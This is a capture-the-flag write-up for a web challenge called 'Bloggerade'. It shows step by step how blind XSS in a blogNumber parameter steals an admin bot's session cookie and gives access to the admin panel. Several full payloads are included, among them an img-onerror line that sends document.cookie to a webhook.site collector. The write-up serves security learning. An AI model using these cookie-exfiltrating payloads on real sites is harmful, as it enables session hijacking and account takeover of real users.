# Bloggerade Challenge

**Points:** 200  
**Category:** Web  

![Initial State](screenshots/bloggerade1.png)

This application allows users to enter input, which is then reviewed by the admin. Situations like these often present opportunities for Blind XSS attacks to steal Session Cookies.

## Steps to Exploit

1. **Testing for XSS:**  
   Check for XSS by observing that the blogs have a Blog Number, reflected on the page. Try reflecting the Session ID in the `blogNumber` parameter using the input:  
   `%3Cscript%3Edocument.write(document.cookie);%3C/script%3E`  
   ![Blog Number XSS Test](screenshots/bloggerade2.png)
   ![Blog Number XSS Reflection](screenshots/bloggerade3.png)

2. **Executing Blind XSS:**  
   Set up a platform to catch requests/responses at [https://webhook.site](https://webhook.site).  
   **Payload:** `2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/481ad6c7-c027-4329-9062-0225dc0e8044/?%27%2bdocument.cookie;%3E`  
   **Parameter:** `blogNumber`  
   After executing, the cookies are captured.  
   ![Captured Cookies](screenshots/bloggerade4.png)

3. **Using URL as Payload:**  
   Change the input type of `url` from URL to text to enter the payload.  
   **Payload:** `http://18.225.156.202:9090/blog?blogNumber=2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/481ad6c7-c027-4329-9062-0225dc0e8044/?%27%2bdocument.cookie;%3E`  
   **Parameter:** `url`  
   ![URL Payload Entry](screenshots/bloggerade5.png)
   ![URL Payload Result](screenshots/bloggerade6.png)  
   The session id `admincokie123thiswillallowyoutogototheadminpanel` is obtained.  

4. **Accessing Admin Panel:**  
   Use the captured session id in place of your own to access the admin's session. Then click on "Admin Panel".  
   ![Access Admin Panel](screenshots/bloggerade7.png)  
   ![Admin Panel Accessed](screenshots/bloggerade8.png)

## Flag

`Amazon{XSS_b0t_G0t_Pwn3d}`
